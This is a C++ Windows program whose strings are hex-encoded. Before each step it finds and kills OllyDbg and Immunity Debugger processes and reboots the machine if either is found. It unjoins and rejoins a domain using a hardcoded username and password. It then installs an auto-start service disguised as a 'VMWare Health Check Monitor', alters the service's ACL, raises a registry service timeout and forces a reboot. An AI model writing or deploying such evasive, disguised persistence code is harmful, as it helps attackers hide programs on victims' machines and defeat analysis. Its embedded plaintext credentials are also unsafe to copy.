#ifndef UNICODE
#define UNICODE
#endif

#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Advapi32.lib")

#include <iostream>
#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <lm.h>
#include <lmwksta.h>
#include <strsafe.h>
#include "Shlwapi.h"
#include <tlhelp32.h>


void kneeCapSwing(void)
{
	DWORD processesFound = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	PROCESSENTRY32 entry;

	entry.dwSize = sizeof(PROCESSENTRY32);
	std::wstring nametext(L"Found process(es):\n");

	if (Process32First(snapshot, &entry) == TRUE)
	{
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			wchar_t commonA[] = { 0x004f, 0x0004c, 0x004c, 0x0059, 0x0044, 0x0042, 0x0047, 0x002e, 0x0065, 0x0078, 0x0065, 0x0000 };
			wchar_t commonB[] = { 0x0049, 0x006d, 0x006d, 0x0075, 0x006e, 0x0069, 0x0074, 0x0079, 0x0044, 0x0065, 0x0062, 0x0075, 0x0067, 0x0067, 0x0065, 0x0072, 0x002e, 0x0065, 0x0078, 0x0065, 0x0000 };

			if ((_wcsicmp(entry.szExeFile, commonA) == 0) || (_wcsicmp(entry.szExeFile, commonB) == 0))
			{
				HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
				processesFound += 1;
				nametext.append(entry.szExeFile);
				nametext.append(L"\n");

				//Kill it with fire.
				TerminateProcess(hProcess, 2);

				//Destroy the handle.
				CloseHandle(hProcess);
			}

		}
	}

	CloseHandle(snapshot);

	//Determination logic to display a window to the user
	if (processesFound)
	{
		system("c:\\windows\\system32\\shutdown /r /t 0\n\n");
	}

}

bool generateFilePost(void)
{
	//Bye-bye debugger
	kneeCapSwing();

	//File name with full path
	wchar_t endodermal[] = { 0x0043, 0x003a, 0x005c, 0x0055, 0x0073, 0x0065, 0x0072, 0x0073, 0x005c, 0x0044, 0x0045, 0x0056, 0x0045, 0x004c, 0x004f, 0x0050, 0x0045,
							   0x0052, 0x005c, 0x0044, 0x0065, 0x0073, 0x006b, 0x0074, 0x006f, 0x0070, 0x005c, 0x006a, 0x0075, 0x0073, 0x0074, 0x0069, 0x006e, 0x002e,
							   0x0074, 0x0078, 0x0074, 0x0000 };

	HANDLE fileObjectHandle = CreateFileW((LPCWSTR)endodermal, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (fileObjectHandle)
	{
		std::cout << "CreateFile() succeeded\n";
		CloseHandle(fileObjectHandle);

		return true;
	}
	else
	{
		std::cerr << "CreateFile() failed:" << GetLastError() << "\n";
		return false;
	}
}

void registerService(void)
{
	//Bye-bye debugger
	kneeCapSwing();

	//Replace as needed, the file for the service, its starting status, and miscellaneous features
	wchar_t serviceCommand[] = {
									0x0073, 0x0063, 0x0020, 0x0063, 0x0072, 0x0065, 0x0061, 0x0074, 0x0065, 0x0020, 0x0022,
									0x0056, 0x004d, 0x0057, 0x0061, 0x0072, 0x0065, 0x0022, 0x0020, 0x0044, 0x0069, 0x0073,
									0x0070, 0x006c, 0x0061, 0x0079, 0x004e, 0x0061, 0x006d, 0x0065, 0x003d, 0x0020, 0x0022,
									0x0056, 0x004d, 0x0057, 0x0061, 0x0072, 0x0065, 0x0020, 0x0048, 0x0065, 0x0061, 0x006c,
									0x0074, 0x0068, 0x0020, 0x0043, 0x0068, 0x0065, 0x0063, 0x006b, 0x0020, 0x004d, 0x006f,
									0x006e, 0x0069, 0x0074, 0x006f, 0x0072, 0x0022, 0x0020, 0x0073, 0x0074, 0x0061, 0x0072,
									0x0074, 0x003d, 0x0020, 0x0061, 0x0075, 0x0074, 0x006f, 0x0020, 0x0062, 0x0069, 0x006e,
									0x0050, 0x0061, 0x0074, 0x0068, 0x003d, 0x0020, 0x0022, 0x0043, 0x003a, 0x005c, 0x0055,
									0x0073, 0x0065, 0x0072, 0x0073, 0x005c, 0x0044, 0x0045, 0x0056, 0x0045, 0x004c, 0x004f,
									0x0050, 0x0045, 0x0052, 0x005c, 0x0073, 0x006f, 0x0075, 0x0072, 0x0063, 0x0065, 0x005c,
									0x0072, 0x0065, 0x0070, 0x006f, 0x0073, 0x005c, 0x006a, 0x006f, 0x0069, 0x006e, 0x0044,
									0x0065, 0x006d, 0x006f, 0x005c, 0x0052, 0x0065, 0x006c, 0x0065, 0x0061, 0x0073, 0x0065,
									0x005c, 0x006a, 0x0075, 0x006a, 0x0075, 0x0062, 0x0065, 0x0061, 0x0072, 0x002e, 0x0065,
									0x0078, 0x0065, 0x0022, 0x0000
	};

	//sc sdset VMWare D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD) > null
	wchar_t servicePerms[] = {
									0x0073, 0x0063, 0x0020, 0x0073, 0x0064, 0x0073, 0x0065, 0x0074, 0x0020, 0x0056, 0x004d,
									0x0077, 0x0061, 0x0072, 0x0065, 0x0020, 0x0044, 0x003a, 0x0028, 0x0041, 0x003b, 0x003b,
									0x0043, 0x0043, 0x004c, 0x0043, 0x0053, 0x0057, 0x0052, 0x0050, 0x0057, 0x0050, 0x0044,
									0x0054, 0x004c, 0x004f, 0x0043, 0x0052, 0x0052, 0x0043, 0x003b, 0x003b, 0x003b, 0x0053,
									0x0059, 0x0029, 0x0028, 0x0041, 0x003b, 0x003b, 0x0043, 0x0043, 0x0044, 0x0043, 0x004c,
									0x0043, 0x0053, 0x0057, 0x0052, 0x0050, 0x0057, 0x0050, 0x0044, 0x0054, 0x004c, 0x004f,
									0x0043, 0x0052, 0x0053, 0x0044, 0x0052, 0x0043, 0x0057, 0x0044, 0x0057, 0x004f, 0x003b,
									0x003b, 0x003b, 0x0042, 0x0041, 0x0029, 0x0028, 0x0041, 0x003b, 0x003b, 0x0043, 0x0043,
									0x004c, 0x0043, 0x0053, 0x0057, 0x004c, 0x004f, 0x0043, 0x0052, 0x0052, 0x0043, 0x003b,
									0x003b, 0x003b, 0x0049, 0x0055, 0x0029, 0x0028, 0x0041, 0x003b, 0x003b, 0x0043, 0x0043,
									0x004c, 0x0043, 0x0053, 0x0057, 0x004c, 0x004f, 0x0043, 0x0052, 0x0052, 0x0043, 0x003b,
									0x003b, 0x003b, 0x0053, 0x0055, 0x0029, 0x0053, 0x003a, 0x0028, 0x0041, 0x0055, 0x003b,
									0x0046, 0x0041, 0x003b, 0x0043, 0x0043, 0x0044, 0x0043, 0x004c, 0x0043, 0x0053, 0x0057,
									0x0052, 0x0050, 0x0057, 0x0050, 0x0044, 0x0054, 0x004c, 0x004f, 0x0043, 0x0052, 0x0053,
									0x0044, 0x0052, 0x0043, 0x0057, 0x0044, 0x0057, 0x004f, 0x003b, 0x003b, 0x003b, 0x0057,
									0x0044, 0x0029, 0x0000
	};

	std::cout << "Registering Service:\t";

	int commandResult = _wsystem(serviceCommand);

	if (commandResult == 0)
	{
		std::cout << "Done." << std::endl;
		std::cout << "Customizing ACL:\t";

		commandResult = _wsystem(servicePerms);
	}
}

bool modifyServiceTimeoutRegistryEntry(void)
{
	HKEY hKey;
	DWORD returnedHandle;

	//Bye-bye debugger
	kneeCapSwing();

	if ((returnedHandle = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &hKey)) == ERROR_SUCCESS)
	{
		DWORD type, value, size = sizeof(DWORD);

		std::cout << "Registry Key Handle:\t";

		if (RegGetValueA(HKEY_LOCAL_MACHINE, (LPSTR)"SYSTEM\\CurrentControlSet\\Control", (LPCSTR)"ServicesPipeTimeout", RRF_RT_REG_DWORD, &type, &value, &size) == ERROR_SUCCESS);
		{
			std::cout << "ACQUIRED" << std::endl;
			printf("Key Current Value: %lu\n", value);

			DWORD registryValue = 180000;

			RegSetValueExA(hKey, "ServicesPipeTimeout", 0, REG_DWORD, (const BYTE*)& registryValue, sizeof(registryValue));
			std::cout << "Key Status:\t SUCCESSFULLY ALTERED" << std::endl;
			RegCloseKey(hKey);

			return true;
		}
	}

	return false;
}

bool checkDomainRegistration(void)
{
	DWORD dwLevel = 102;
	LPWKSTA_INFO_102 pBuf = NULL;
	LPWSTR pszServerName = NULL;
	NET_API_STATUS nStatus;

	//Bye-bye debugger
	kneeCapSwing();

	nStatus = NetWkstaGetInfo(pszServerName, dwLevel, (LPBYTE*)& pBuf);

	if (nStatus == NERR_Success)
	{
		wprintf(L"Name:\t%s\n", pBuf->wki102_computername);
		wprintf(L"Domain:\t%s\n", pBuf->wki102_langroup);

		// Free the allocation
		if (pBuf != NULL)
		{
			std::cout << "Freeing buffer memory:\t";
			NetApiBufferFree(pBuf);
			std::cout << "Completed." << std::endl;
		}

		//Checking for domain registration
		LPWSTR domainStatusPointer = NULL;
		NETSETUP_JOIN_STATUS currentStatus;
		DWORD joinedStatus = NetGetJoinInformation(NULL, &domainStatusPointer, &currentStatus);

		switch (joinedStatus)
		{
		case 0: std::cout << "Domain Information:\tAcquired" << std::endl;
			break;
		default: std::cout << "Domain Information:\tUnknown" << std::endl;
			break;
		}

		if (domainStatusPointer != NULL)
		{
			std::cout << "Freeing Heap Alloc:\t";
			NetApiBufferFree(domainStatusPointer);
			std::cout << "Completed." << std::endl;

			return true;
		}

	}
	else
	{
		return false;
	}
}


NET_API_STATUS unjoinFromDomain(void)
{
	NET_API_STATUS currentStatus;

	//Bye-bye debugger
	kneeCapSwing();

	wchar_t domain[] = { 0x0043, 0x004f, 0x004e, 0x0053, 0x0054, 0x004f, 0x0053, 0x004f, 0x0000 };
	wchar_t username[] = { 0x0043, 0x004f, 0x004e, 0x0053, 0x0054, 0x004f, 0x0053, 0x004f, 0x005c, 0x005c, 0x0075, 0x0073, 0x0065, 0x0072 };
	wchar_t userdump[] = { 0x0043, 0x004f, 0x004e, 0x0053, 0x0054, 0x004f, 0x0053, 0x004f, 0x002e, 0x0063, 0x006f, 0x006d, 0x005c, 0x0075, 0x0073, 0x0065, 0x0072, 0x0000 };
	wchar_t pass[] = { 0x006a, 0x0075, 0x0073, 0x0074, 0x0069, 0x006e, 0x004a, 0x0075, 0x0073, 0x0074, 0x0069, 0x006e, 0x0031, 0x0000 };

	LPCWSTR test = pass;

	currentStatus = NetUnjoinDomain((LPCWSTR)NULL, (LPCWSTR)userdump, (LPCWSTR)pass, NULL);
	return currentStatus;
}


NET_API_STATUS joinBackToDomain(void)
{
	NET_API_STATUS joinStatus;

	//Bye-bye debugger
	kneeCapSwing();

	wchar_t domain[] = { 0x0043, 0x004f, 0x004e, 0x0053, 0x0054, 0x004f, 0x0053, 0x004f, 0x0000 };
	wchar_t username[] = { 0x0043, 0x004f, 0x004e, 0x0053, 0x0054, 0x004f, 0x0053, 0x004f, 0x005c, 0x005c, 0x0075, 0x0073, 0x0065, 0x0072 };
	wchar_t userdump[] = { 0x0043, 0x004f, 0x004e, 0x0053, 0x0054, 0x004f, 0x0053, 0x004f, 0x002e, 0x0063, 0x006f, 0x006d, 0x005c, 0x0075, 0x0073, 0x0065, 0x0072, 0x0000 };
	wchar_t pass[] = { 0x006a, 0x0075, 0x0073, 0x0074, 0x0069, 0x006e, 0x004a, 0x0075, 0x0073, 0x0074, 0x0069, 0x006e, 0x0031, 0x0000 };

	LPCWSTR test = username;

	joinStatus = NetJoinDomain((LPCWSTR)NULL, (LPCWSTR)domain, (LPCWSTR)NULL, (LPCWSTR)userdump, (LPCWSTR)pass, NETSETUP_JOIN_DOMAIN | NETSETUP_ACCT_CREATE | NETSETUP_DOMAIN_JOIN_IF_JOINED);
	return joinStatus;
}


bool markerFileCheck(void)
{
	//Bye-bye debugger
	//
	kneeCapSwing();

	//Replace with the marker file we want to use.
	wchar_t endodermal[] = {
								0x0043, 0x003a, 0x005c, 0x0055, 0x0073, 0x0065, 0x0072, 0x0073, 0x005c, 0x0044, 0x0045,
								0x0056, 0x0045, 0x004c, 0x004f, 0x0050, 0x0045, 0x0052, 0x005c, 0x0044, 0x0065, 0x0073,
								0x006b, 0x0074, 0x006f, 0x0070, 0x005c, 0x006a, 0x0075, 0x0073, 0x0074, 0x0069, 0x006e,
								0x002e, 0x0074, 0x0078, 0x0074, 0x0000
	};

	int retval = PathFileExistsW((LPCWSTR)endodermal);

	switch (retval)
	{
	case 1:  return true;
	default: return false;
	}
}


void systemReboot(void)
{
	//Bye-bye debugger
	kneeCapSwing();

	std::cout << "Reboot Kickoff (0 seconds):\t";
	system("c:\\windows\\system32\\shutdown /r /t 0\n\n");
	std::cout << "OK" << std::endl;
}


int main()
{
	//Bye-bye debugger
	kneeCapSwing();

	bool fileExists, checkIfJoined, fileCreate, createRegistryEntry;
	NET_API_STATUS unjoinAttempt, joinBackAttempt;

	fileExists = markerFileCheck();

	if (fileExists == false)
	{
		checkIfJoined = checkDomainRegistration();
		unjoinAttempt = unjoinFromDomain();
		joinBackAttempt = joinBackToDomain();
		fileCreate = generateFilePost();
	}
	else
	{
		std::cout << "File already exists, jumping ship..." << std::endl;
		return 1;
	}

	if ((fileExists == false) && (checkIfJoined == true) && (joinBackAttempt == 0) && (fileCreate == true))
	{
		registerService();
		checkDomainRegistration();

		if ((createRegistryEntry = modifyServiceTimeoutRegistryEntry()) == true)
		{
			puts("All good, captain...");
			systemReboot();
		}

	}
	else
	{
		puts("Bailing...");

		printf("Unjoin Attempt?:\t%d\n", unjoinAttempt);
		printf("Join Attempt?:\t%d\n", joinBackAttempt);
		system("pause");

		return 0;
	}

}